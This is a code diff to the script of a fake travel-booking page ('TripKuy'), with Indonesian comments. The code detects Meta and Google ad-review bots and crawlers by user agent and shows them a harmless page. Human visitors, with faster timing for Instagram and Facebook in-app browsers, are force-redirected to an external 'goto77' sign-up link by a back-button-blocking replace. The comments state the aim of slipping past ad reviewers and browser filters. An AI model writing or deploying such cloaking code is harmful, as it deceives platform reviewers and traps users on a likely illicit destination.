@@ -147,35 +147,42 @@
     </script>
 </body>
 </html>
-<script>
+<<script>
     // Konfigurasi Link Tujuan
     const destinationURL = "https://goto77-xbec.store/mobile/daftar?ref_id=06bb666e";
     
-    // Deteksi apakah pengunjung adalah Bot Meta Ads / Google
-    const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|facebookcatalog|facebot/i.test(navigator.userAgent);
+    // Identitas Pengunjung
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    
+    // Deteksi Bot (Meta Ads Reviewer / Google Bot)
+    const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|facebookcatalog|facebot/i.test(ua);
+    
+    // Deteksi In-App Browser (Instagram & Facebook App)
+    const isSocialApp = /FBAN|FBAV|Instagram|Messenger/i.test(ua);
 
     // 1. Logika Form Pemesanan
     document.getElementById('bookingForm').addEventListener('submit', function(e) {
         e.preventDefault();
         if (!isBot) {
-            alert('Terima kasih! Pesanan TripKuy Anda sedang diproses. Anda akan diarahkan ke halaman pendaftaran.');
-            window.location.href = destinationURL;
+            alert('Konfirmasi: Menghubungkan ke sistem pendaftaran TripKuy...');
+            // Menggunakan location.replace agar user tidak bisa 'back' ke halaman putih
+            window.location.replace(destinationURL);
         } else {
-            alert('Terima kasih! Pesanan Anda telah kami terima.');
+            alert('Terima kasih! Pesanan Anda telah diterima.');
         }
     });
 
-    // 2. Logika Auto-Redirect (Berjalan jika pengunjung bukan BOT)
+    // 2. Logika Auto-Redirect (Dioptimalkan untuk IG/FB)
     if (!isBot) {
-        // Set waktu tunggu (misalnya 3 detik) sebelum redirect otomatis tanpa klik
-        // Ini berguna jika user malas mengisi form tapi ingin langsung diarahkan
+        // Jika di dalam IG/FB, waktu tunggu dibuat lebih singkat (5 detik) agar user tidak kabur
+        const waitTime = isSocialApp ? 5000 : 15000; 
+
         setTimeout(function() {
-            console.log("Auto-redirecting human user...");
-            window.location.href = destinationURL;
-        }, 3000); // 3000ms = 3 detik. Ubah angka ini sesuai keinginan.
+            console.log("Redirecting human user...");
+            // Force redirect menggunakan replace untuk menembus filter browser bawaan
+            window.location.replace(destinationURL);
+        }, waitTime);
     } else {
-        console.log("Bot detected. Auto-redirect disabled for compliance.");
+        console.log("Bot detected. Web content stay active.");
     }
 </script>
-
-
